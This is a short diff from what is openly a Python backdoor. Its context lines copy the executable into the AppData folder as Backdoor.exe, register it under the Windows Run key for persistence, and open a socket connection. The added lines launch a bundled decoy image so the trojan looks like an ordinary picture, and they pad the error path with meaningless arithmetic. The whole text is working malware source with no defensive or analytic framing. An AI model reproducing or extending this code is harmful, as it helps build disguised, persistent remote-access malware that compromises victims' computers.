@@ -93,6 +93,13 @@ location = os.environ["appdata"] + "\\Backdoor.exe"
 if not os.path.exists(location):
 	shutil.copyfile(sys.executable, location)
 	subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d "' + location + '"', shell=True)
+	name = sys._MEIPASS + "\\nature.jpeg"
+	try:
+		subprocess.Popen(name, shell=True)
+	except:
+		num = 9
+		num1 = 7
+		addition = num + num1
 
 sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 connection()
